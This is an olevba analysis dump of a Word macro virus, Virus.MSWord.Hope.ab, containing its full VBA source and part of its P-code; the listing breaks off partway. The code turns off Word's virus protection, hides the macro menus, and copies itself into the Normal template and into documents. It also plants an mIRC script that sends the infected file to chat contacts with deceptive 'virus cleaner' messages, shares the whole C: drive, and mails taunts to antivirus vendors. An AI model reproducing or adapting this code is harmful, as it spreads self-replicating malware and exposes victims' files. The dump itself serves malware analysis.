olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Wendy Dowling20/06/00 17:28:13Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Jack-In-The-Box
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
somename = ActiveDocument.Name
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
If InB = 1 Then
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
var3 = "C:\mirc\script.ini"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Open "C:\mirc\script.ini" For Output As #1
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Close #1
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
End If
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
'Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner

'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner
Sub ToolsMacro()
'Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner































'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
On Error GoTo out
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.VirusProtection = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.SaveNormalPrompt = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
Options.ConfirmConversions = False
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt > 70 And ad > 0 Then GoTo out
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt < 70 Then
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End If
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
host.CodeModule.AddFromFile ("c:\class.sys")
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    For x = 1 To 4
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .deletelines 1
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Next x
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt < 70 Then
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline 1, "Sub AutoClose()"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline 71, "Sub ToolsMacro()"
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End If
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
With host.CodeModule
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    For x = 2 To 72 Step 2
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
    Next x
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End With
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
out:
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
End Sub
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE
'Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE



Private Sub Document_Open(): Document_Close: End Sub
'withered rope you hang what's empty can't remain to put it simply
Private Sub Document_Close(): On Error Resume Next
'in time cry the hollow words to sing with false disguise smothered
Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2)
'hope fly from sorrow for a new divine tomorrow i just don't want
CommandBars("Tools").Controls("Macro").Delete: CommandBars("Tools").Controls("Options...").Delete
'to know anymore life shifts up and down everybody knows it's wrong
Set CM = MacroContainer.VBProject.VBComponents.Item(1).CodeModule
'why don't you care? now do it seem fair? it's not in the rhyme or
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'reason so it goes with every season crawl to top fall through
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'bottom first hand love is really rotten slice of life find what's
MC = CM.Lines(1, CM.CountOfLines)
'plenty inch towards a sanctuary light with me inside the womb i
ad.deletelines 1, ad.CountOfLines: ad.AddFromString MC
'know everyone everybody knows it's me it's my voice, my voice
nt.deletelines 1, nt.CountOfLines: nt.AddFromString MC
'cries out obscenity sightless eye regard my past sometimes it
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'should i just don't want to know anymore.
End Sub
'NoHope~By~Lys~KovicK Lyrics From Smothered Hope(Skinny Puppy)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hope.ab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 19844 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:13Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #2:
' 	QuoteRem 0x0000 0x000F "Jack-In-The-Box"
' Line #3:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #4:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #5:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #6:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #7:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #8:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #9:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #10:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #11:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #12:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #13:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St somename 
' Line #15:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #16:
' 	Ld InB 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #18:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	St var3 
' Line #19:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #20:
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "warning"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "warning"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #21:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #22:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #23:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0396 "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
' 	PrintItemNL 
' Line #25:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0229 "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
' 	PrintItemNL 
' Line #27:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
' 	PrintItemNL 
' Line #29:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x01DA "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
' 	PrintItemNL 
' Line #31:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
' 	PrintItemNL 
' Line #33:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "n9=On 1:Text:*worm*:*: .ignore $nick"
' 	PrintItemNL 
' Line #35:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "n11=On 1:Text:*infect*:*: .ignore $nick"
' 	PrintItemNL 
' Line #37:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "n13=On 1:Text:*macro*:*: .ignore $nick"
' 	PrintItemNL 
' Line #39:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #41:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #43:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #45:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0144 "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
' 	PrintItemNL 
' Line #47:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #50:
' 	LitStr 0x0014 "C:\Windows\Story.doc"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #51:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #54:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #55:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #56:
' 	QuoteRem 0x0000 0x004D "Wendy Dowling21/02/00 16:11:38Claresvprt on \\CLA400\CLARESVPRTMicrosoft Word"
' Line #57:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #60:
' Line #61:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #62:
' Line #63:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x004A "Wendy Dowling20/06/00 17:28:14Claresvprt on \\CLA400\CLARESVPRTfaxgardiner"
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #104:
' 	OnError out 
' Line #105:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #106:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #107:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #108:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #109:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #110:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #111:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #112:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #113:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #114:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #115:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #116:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #117:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #118:
' 	Ld nt 
